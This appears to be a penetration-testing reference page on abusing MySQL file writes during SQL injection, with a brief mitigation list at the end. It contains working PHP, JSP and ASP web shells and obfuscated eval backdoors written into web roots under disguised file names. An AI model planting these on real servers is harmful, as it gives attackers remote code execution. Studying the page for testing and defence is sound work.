---
title: Writing Files
description: Techniques for writing files to the filesystem using MySQL
category: File Operations
order: 16
tags: ["file operations", "outfile", "dumpfile", "web shell"]
lastUpdated: 2025-03-15
---

## Writing Files

MySQL provides functionality to write data to files on the server's filesystem, which can be exploited during SQL injection attacks if the database user has sufficient privileges.

### Prerequisites

To write files from MySQL, the following conditions must be met:

1. The MySQL user must have the `FILE` privilege
2. The directory must be writable by the MySQL server process (usually `mysql` user)
3. You must know the absolute path where you want to write
4. The `secure_file_priv` setting must either be empty or set to a directory where you can write

### Methods for Writing Files

MySQL provides two primary statements for writing to files:

#### SELECT INTO OUTFILE

Writes a result set to a file, adding newlines between rows and field separators between columns:

```sql
SELECT 'data to write' INTO OUTFILE '/path/to/file.txt';
```

#### SELECT INTO DUMPFILE

Writes a result set to a file without any formatting (better for binary data and web shells):

```sql
SELECT 'data to write' INTO DUMPFILE '/path/to/file.txt';
```

### Checking for FILE Privilege

Before attempting to write files, check if the current user has the necessary privilege:

```sql
-- Option 1: Check directly in mysql.user table (requires additional privileges)
SELECT File_priv FROM mysql.user WHERE user = SUBSTRING_INDEX(USER(), '@', 1);

-- Option 2: Check through information_schema (more commonly accessible)
SELECT 1 FROM information_schema.user_privileges
WHERE grantee LIKE CONCAT("'", SUBSTRING_INDEX(USER(), '@', 1), "'@%")
AND privilege_type = 'FILE';
```

### Checking secure_file_priv Setting

The `secure_file_priv` setting restricts where MySQL can read/write files:

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

Results:

- Empty value: You can read/write anywhere
- NULL: You cannot read/write any files
- Directory path: You can only read/write in that directory

### Writing a Web Shell

One of the most common exploits is writing a web shell to gain remote code execution:

#### PHP Web Shell

```sql
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

-- Or more obfuscated:
SELECT '<?php $c=$_GET["c"]; if(isset($c)) { eval(base64_decode($c)); } ?>' INTO OUTFILE '/var/www/html/images/blank.php';
```

#### JSP Web Shell

```sql
SELECT '<%@ page import="java.util.*,java.io.*"%><% Process p = Runtime.getRuntime().exec(request.getParameter("cmd")); %>' INTO OUTFILE '/var/lib/tomcat/webapps/ROOT/shell.jsp';
```

#### ASP Web Shell

```sql
SELECT '<%Response.Write(CreateObject("WScript.Shell").exec(Request.QueryString("cmd")).StdOut.ReadAll())%>' INTO OUTFILE 'C:/inetpub/wwwroot/shell.asp';
```

### Writing Multiple Lines

For multiline content, you can use string concatenation and CHAR():

```sql
SELECT CONCAT(
  '<?php', CHAR(10),
  '// PHP Backdoor', CHAR(10),
  'if(isset($_POST["pass"]) && $_POST["pass"] == "secret") {', CHAR(10),
  '    eval(base64_decode($_POST["code"]));', CHAR(10),
  '}', CHAR(10),
  '?>'
) INTO DUMPFILE '/var/www/html/cache/stats.php';
```

### Overcoming Restrictions

#### When secure_file_priv is set

If `secure_file_priv` is set to a specific directory, you're limited to writing there:

```sql
-- Write to allowed directory, then create a symlink (requires other vulnerabilities)
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/lib/mysql-files/shell.php';
-- Then leverage another vulnerability to create a symlink from web root to this file
```

#### Finding Writable Directories

Common writable directories:

```text
/var/www/html/
/var/www/html/images/
/var/www/html/uploads/
/var/www/html/cache/
/tmp/
/var/tmp/
```

### Practical Examples

#### Writing a Simple Backdoor

```sql
-- Check where we can write
SHOW VARIABLES LIKE 'secure_file_priv';

-- Write a minimal backdoor
SELECT '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; system($_REQUEST["cmd"]); echo "</pre>"; } ?>'
INTO DUMPFILE '/var/www/html/images/1.php';
```

#### Appending to Files

MySQL can't directly append to files, but you can sometimes use tricks with UNION:

```sql
-- Create file with first line
SELECT 'First line' INTO OUTFILE '/tmp/test.txt';

-- Use a different MySQL client to append (this doesn't work in a single session)
SELECT 'Second line' INTO OUTFILE '/tmp/test.txt';  -- Will overwrite or fail
```

### Mitigation

To prevent unauthorized file writing:

1. Limit FILE privilege to trusted users only
2. Set `secure_file_priv` to restrict file operations to a specific directory or NULL
3. Use prepared statements in application code
4. Implement proper input validation
5. Run MySQL with minimum necessary privileges
